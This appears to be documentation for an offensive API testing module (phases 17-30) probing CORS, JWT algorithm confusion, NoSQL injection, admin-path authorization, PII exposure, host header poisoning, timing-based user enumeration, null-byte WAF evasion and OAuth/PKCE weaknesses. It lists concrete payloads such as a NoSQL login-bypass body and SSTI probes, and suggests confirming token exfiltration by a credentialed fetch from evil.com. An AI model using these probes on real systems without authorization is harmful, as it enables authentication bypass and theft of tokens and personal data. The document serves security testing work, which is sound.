# Business Logic and Version Exposure

Run the parallel phase batch phases 17-30 of the API RE pipeline against a mapped API: covering CORS misconfiguration, JWT algorithm confusion RS256→HS256, NoSQL injection, Broken Function Level Authorization (BFLA), excessive data exposure and PII scanning, host header injection, timing-oracle user enumeration, second-order injection, null byte/WAF evasion, OAuth2 dynamic client registration, WebSocket/SSE enumeration, pagination traversal, shadow/deprecated API version detection, and OAuth2 state parameter / PKCE downgrade attacks.

---

## Why this exists

1. **CORS misconfiguration with `Access-Control-Allow-Credentials: true` and origin reflection allows cross-origin cookie and token theft, but most API scanners report all CORS issues at the same severity regardless of whether credentials are enabled.** `probe_cors()` distinguishes between three levels: `*` wildcard data exposure only, no credentials risk, reflected origin without credentials MEDIUM: cross-origin read allowed, and reflected origin with `Access-Control-Allow-Credentials: true` CRITICAL: cross-origin token/cookie exfiltration. Only the third combination produces an actionable finding.

2. **Shadow and deprecated API versions skip hardening applied to current versions: authentication enforcement, validation, and rate limiting added in `/v2` or `/v3` are frequently absent from `/v0`, `/beta`, `/dev`, and `/api/legacy` paths that are never sunset.** `probe_shadow_versions()` probes 16 shadow path patterns and, for each that returns a non-404, checks whether endpoints marked `auth_required` on the current version return 200 on the shadow version: directly confirming authentication bypass via version downgrade OWASP API9: Improper Inventory Management.

3. **Business logic attacks: negative prices, integer overflow in quantities, privilege escalation via status field injection, and sequence skipping: do not trigger any injection signal and are invisible to automated scanners that only check for error conditions.** `probe_business_logic()` probes numeric parameters `price`, `amount`, `cost`, `qty`, `balance` with boundary values 0, -1, 99999999, `NaN`, `Infinity` and status/role parameters `status`, `role`, `tier`, `plan` with privileged strings `admin`, `approved`, `verified`, `premium`. A sentinel baseline comparison (`__sentinel_xyz_12345__`) ensures that endpoints that accept any value don't generate noise.

---

## How it works

```mermaid
flowchart TD
    A(["run_re(base, depth='normal', focus=None) → phases 17-30\nThreadPoolExecutor(max_workers=6)\nAll phases in this document run in parallel\n(depth='normal' unless noted)"]):::input --> B["Phase 17: probe_cors(base, endpoints):\n3 origins: evil.com, null, evil.example.com\nFor each endpoint (up to 6 paths):\n  GET + Origin: <test>\n  ACAO==* → CORS_WILDCARD (data exposure)\n  ACAO==origin AND ACAC=='true' → CRITICAL cors_reflect\n  ACAO==origin AND ACAC!='true' → MEDIUM cors_reflect\n  ACAO contains 'null' AND origin=='null' → cors_null"]:::primary
    B:::primary --> C["Phase 18: probe_jwt_alg_confusion(base, endpoints):\n6 JWKS paths: /.well-known/jwks.json, /jwks, /oauth/keys...\nFor RSA keys: log rsa_public_key_exposed + attack note\n  'Forge HS256 JWT using public key as HMAC secret'\nFor JWTs found in responses:\n  alg in RS256/RS384/ES256/ES384/ES512 → jwt_asymmetric_alg candidate"]:::secondary
    C:::secondary --> D["Phase 19: probe_nosql_injection(base, endpoints):\nJSON body: {param: {'$gt':''}} / {'$ne':'x'} / {'$regex':'.*'} / {'$where':'1==1'}\nPOST/PUT → code==200 + len(content)>100 → nosql_operator_inject\nQS: ?param[$ne]=1 / [gt]= / [regex]=.* → nosql_qs_inject\nAuth endpoints (login/auth/signin): {username:{'$ne':''},password:{'$ne':''}}\n  200 + token in response → nosql_auth_bypass"]:::tertiary
    D:::tertiary --> E["Phase 20: probe_bfla(base, endpoints):\n16 admin paths: /admin, /management, /internal, /api/admin...\n  non-404/401/403 → bfla_admin_accessible\nPrivileged operations on resource endpoints:\n  POST {path}/promote, DELETE {path}/delete,\n  POST {path}/ban, GET {path}/export, GET {path}/backup\n  non-404/405 → bfla_privileged_op"]:::tertiary
    E:::tertiary --> F["Phase 21: probe_excessive_data_exposure(base, endpoints):\n10 PII_PATTERNS: email, SSN, credit card, US phone, API key,\n  Bearer token, password_in_response, private key, AWS AKIA key,\n  internal IPv4 (10.x, 192.168.x, 172.16-31.x)\nlen(response) > 50000 + isinstance(data, list) + len > 100 → DATA_BULK"]:::tertiary
    F:::tertiary --> G(["Phase 22: probe_host_header_injection(base, endpoints):\nHosts: evil.com, localhost, 169.254.169.254\nDirect Host header → evil.com reflected → host_header_reflect\nOverride headers: X-Forwarded-Host, X-Host, X-Forwarded-Server...\n  evil.com reflected → host_override_reflect\nPOST /password-reset + Host: evil.com → host_reset_link_poison"]):::output
    H(["Phase 23 (deep only): probe_timing_oracle(base, endpoints):\n8 samples × valid username vs fake username\nfake_user='zzz_definitely_not_real_xyz_12345'\nFor admin/administrator/root: measure avg POST time\nabs(real_avg - fake_avg) > 0.05s → timing_oracle_user_enum\n(bcrypt lookup happens before password check for valid users)"]):::input
    I(["Phase 24 (deep only): probe_second_order_injection():\nStore payloads (XSS, SQLi, SSTI, path traversal) via POST\nRetrieve via GET endpoints; check for reflection\n{{7*7}} stored → 49 in GET response → SSTI evaluated"]):::input
    J(["Phase 25: probe_null_byte_evasion(base, endpoints):\nNull variants: '\\x00', '%00', '\\x00.jpg', '%00.jpg'\nParam: safe_value{null_var}admin; sentinel baseline comparison\nPath: /admin%00.json non-404/400 → null_byte_path\nDouble-encode bypass: %27→%2527 for ' in params"]):::input
    K(["Phase 26: probe_oauth_dynamic_reg(base, endpoints):\n7 registration paths: /oauth/clients, /connect/register...\nPOST reg_payload without auth → 200/201 → oauth_dynamic_reg_unauth\nPOST fake_token to /oauth/introspect → 'active' in response → token_introspect_unauth\nPOST garbage_token to /oauth/revoke → non-404 → token_revoke_endpoint"]):::input
    L(["Phase 27: probe_websocket(base):\nGET + Accept: text/event-stream → content-type starts text/event-stream → sse_stream\nGET + Upgrade/Connection/Sec-WebSocket-Key/Version headers\n  101 → websocket_upgrade; else non-404 with Upgrade hint → websocket_hint\nPOST /graphql subscription { __typename } → graphql_subscription_probe"]):::input
    M(["Phase 28 (deep only): probe_pagination_traversal(base, endpoints):\nCollection endpoints: /users, /items, /products, /orders...\n?page=N&per_page=100 + RFC5988 Link: rel='next' following\nTotal records > 500 → bulk_enumeration\nUp to 5 pages per collection endpoint"]):::input
    N(["Phase 29: probe_shadow_versions(base, endpoints):\n16 shadow paths: /v0, /beta, /dev, /legacy, /api/internal...\nDeprecation headers: Sunset, Deprecation, X-Deprecated...\nShadow version + auth_required endpoint → test shadow path → shadow_auth_bypass"]):::input
    O(["Phase 30: probe_oauth_state_pkce(base):\n7 /oauth/authorize paths:\n  Request without state → oauth_state_missing (CSRF)\n  code_challenge_method=plain → pkce_plain_accepted\n  redirect_uri=evil.com response 200/302 + 'evil.com' in Location → oauth_open_redirect"]):::input
    classDef input     fill:#0d47a1,stroke:#1565c0,color:#fff
    classDef primary   fill:#e65100,stroke:#bf360c,color:#fff
    classDef secondary fill:#004d40,stroke:#00695c,color:#fff
    classDef tertiary  fill:#4a148c,stroke:#6a1b9a,color:#fff
    classDef neutral   fill:#37474f,stroke:#546e7a,color:#fff
    classDef output    fill:#1b5e20,stroke:#2e7d32,color:#fff
    linkStyle 0 stroke:#bf360c,stroke-width:2px
    linkStyle 1 stroke:#00695c,stroke-width:2px
    linkStyle 2 stroke:#6a1b9a,stroke-width:2px
    linkStyle 3 stroke:#6a1b9a,stroke-width:2px
    linkStyle 4 stroke:#6a1b9a,stroke-width:2px
    linkStyle 5 stroke:#2e7d32,stroke-width:3px
```

### Phase execution control

| Phase | Depth required | Focus gates (in addition to `None`) |
|---|---|---|
| 17 CORS | normal | `auth`, `cors` |
| 18 JWT alg confusion | normal | `jwt`, `auth` |
| 19 NoSQL injection | normal | `injection`, `nosql` |
| 20 BFLA | normal | `bola`, `auth`, `bfla` |
| 21 Data exposure/PII | normal | `schema`, `pii` |
| 22 Host header injection | normal | `injection`, `ssrf` |
| 23 Timing oracle | **deep only** | `auth`, `creds`, `timing` |
| 24 Second-order injection | **deep only** | `injection` |
| 25 Null byte/WAF evasion | normal | `injection`, `evasion` |
| 26 OAuth dynamic registration | normal | `oauth2`, `auth` |
| 27 WebSocket/SSE | normal | `graphql`, `schema`, `websocket` |
| 28 Pagination traversal | **deep only** | `bola`, `schema` |
| 29 Shadow/deprecated versions | normal | `schema`, `shadow` |
| 30 OAuth state/PKCE | normal | `oauth2`, `auth` |

---

## Usage

```python
from modules.api_re import (
    probe_cors, probe_jwt_alg_confusion, probe_nosql_injection,
    probe_bfla, probe_excessive_data_exposure, probe_host_header_injection,
    probe_timing_oracle, probe_second_order_injection, probe_null_byte_evasion,
    probe_oauth_dynamic_reg, probe_websocket, probe_pagination_traversal,
    probe_shadow_versions, probe_oauth_state_pkce, probe_business_logic,
    run_re, APIMap, Endpoint,
)

BASE = 'http://192.168.1.100:5000'

# Run full pipeline including all phases
api = run_re(BASE, depth='deep')  # depth='deep' enables phases 23, 24, 28
print(f"Findings: {len(api.findings)}")

# Run auth-focused subset (phases 8, 16, 17, 18, 20, 26, 30)
api_auth = run_re(BASE, depth='normal', focus='auth')

# Targeted individual probes against a pre-mapped endpoint list
endpoints = api.endpoints  # from prior run_re call

# CORS
cors = probe_cors(BASE, endpoints)
for f in cors:
    print(f"[{f['severity']}] {f['type']}: {f['origin']} creds={f['credentials']}")

# BFLA
bfla = probe_bfla(BASE, endpoints)
for f in bfla:
    print(f"[BFLA] {f['type']}: {f.get('path') or f.get('endpoint')}")

# PII scanner
pii = probe_excessive_data_exposure(BASE, endpoints)
for f in pii:
    print(f"[PII] {f['type']}: {f['endpoint']} matches={f['matches']}")

# Shadow version detection
shadow = probe_shadow_versions(BASE, endpoints)
for f in shadow:
    if f['type'] == 'shadow_auth_bypass':
        print(f"[CRITICAL] Shadow auth bypass: {f['shadow']}{f['endpoint']} returns 200")

# OAuth state and PKCE
oauth_state = probe_oauth_state_pkce(BASE)
for f in oauth_state:
    print(f"[OAuth] {f['type']}: {f.get('path')} status={f.get('status')}")

# Business logic probes
biz = probe_business_logic(BASE, endpoints)
for f in biz:
    print(f"[BIZ] {f['type']}: {f['endpoint']} param={f['param']} value={f['value']}")

# Timing oracle (slow — 8 samples × 3 usernames × 3 auth paths)
timing = probe_timing_oracle(BASE, endpoints, samples=8)
for f in timing:
    print(f"[TIMING] {f['username']}: {f['delta_ms']:.0f}ms delta at {f['path']}")
```

---

## Example output

The following illustrates the `evidence` field format for representative findings. Actual values: email addresses, API keys, JWT tokens, timing deltas, endpoint paths: will reflect the specific target.

```
[CRITICAL] cors_reflect: origin='https://evil.com' creds='true'
  access-control-allow-origin: https://evil.com
  access-control-allow-credentials: true
  → Cross-origin token/cookie theft via authenticated XHR from evil.com

[bfla_admin_accessible] /api/admin: HTTP 200 (<n>b) — admin path accessible without privilege check
  sample: {"<admin-data-fields>":...}

[excessive_data_email] GET /api/v1/users: ['<email>','<email>',...] (<n> matches)
[excessive_data_api_key] GET /api/v1/config: '<api-key-pattern>: <key-value>...'

[shadow_auth_bypass] <shadow-path>/admin: returns 200 while <current-path>/admin requires auth
  (NOTE: requires ep.auth_required=True — see False positives section)

[nosql_auth_bypass] /api/login: {"$ne":""} bypass
  → HTTP 200 body={"token":"<jwt-token>","user":{"id":"<id>","role":"<role>"},...}

[timing_oracle_user_enum] <username> SLOWER by <n>ms vs fake at <auth-path>
  (bcrypt lookup triggered for valid username — user enumeration confirmed)
```

---

## False positives

**`probe_cors()` flags `cors_reflect MEDIUM` when an API reflects the `Origin` header for same-site requests, this is expected CORS behavior for single-page applications.** An SPA at `https://app.target.com` sending XHR to `https://api.target.com` correctly gets its origin reflected in `Access-Control-Allow-Origin`. Without `Access-Control-Allow-Credentials: true`, there is no credential theft risk. Only escalate `cors_reflect` findings where `acac == "true"` AND the reflected origin is a non-allowlisted domain.

**`probe_shadow_versions()` `shadow_auth_bypass` requires `ep.auth_required == True`, but `auth_required` is never set by the pipeline.** `ep.auth_required` defaults to `False` on every `Endpoint` object and is never updated by any phase. The `shadow_auth_bypass` check (`if r2.status_code == 200` on shadow version for `auth_required` endpoints) never fires because no endpoint is ever marked `auth_required`. The finding depends on the caller setting `ep.auth_required = True` after manual auth confirmation. Shadow versions are still discovered and reported via `shadow_version` findings.

**`probe_timing_oracle()` requires a stable network environment: latency jitter > 50ms masks timing differences.** The 50ms significance threshold (`abs(delta) > 0.05`) filters out jitter in most stable local-network environments, but VPN tunnels, cloud endpoints, and load-balanced targets add 50-200ms of jitter that overwhelms the bcrypt timing signal. Increase `samples` from 8 to 20+ to reduce noise, or run from a host on the same network segment as the target.

---

## Pipeline position

**Before this module:** Run phases 1-16 via `run_re(base, depth='normal')` to build `api.endpoints`. Phases 17-30 consume `endpoints` for path selection: running them against an empty endpoint list limits discovery to fixed path lists in each probe function and misses endpoint-specific findings CORS on discovered paths, NoSQL on discovered parameters, PII on discovered collection endpoints.

**After this module:** For `cors_reflect CRITICAL`: demonstrate token exfiltration with `fetch('https://api.target.com/api/v1/me', {credentials:'include'})` from `evil.com` to confirm. For `bfla_admin_accessible`: enumerate `/api/admin/users`, `/api/admin/config`, and `/api/admin/export` to assess full admin surface. For `shadow_version` paths: rerun `run_re(<shadow_base>, depth='normal', focus='auth')` with the shadow version as base URL to assess its auth posture independently. Write confirmed findings to `~/VDT/VULNERABILITIES-<ip>.md`.

---

## Reading findings

| Field | Content |
|:---|:---|
| `f['type']` | Finding type: `cors_reflect`, `bfla_admin_accessible`, `nosql_auth_bypass`, `shadow_auth_bypass`, `timing_oracle_user_enum`, `excessive_data_<pii_type>`, `oauth_dynamic_reg_unauth`, `pkce_plain_accepted`, etc. |
| `f['severity']` CORS only | `CRITICAL` (reflect + credentials=true), `MEDIUM` reflect only, or absent (other phases use `type` as severity signal) |
| `f['path']` or `f['endpoint']` | The API path where the finding was observed |
| `f['sample']` | Body excerpt first 100-300 bytes for BFLA and BOLA findings |
| `f['matches']` | PII regex match list for data exposure findings |

---

## See also

- [Unknown HTTP API Mapping](unknown-http-api-mapping.md): phases 1-16: framework detection, OpenAPI harvest, path fuzzing, injection probing, JWT extraction, OAuth metadata, gRPC, SOAP, JSON-RPC
- [Nginx Configuration Probes](nginx-configuration-probes.md): auth bypass, rate-limit bypass, and LFI probes specific to nginx-fronted APIs
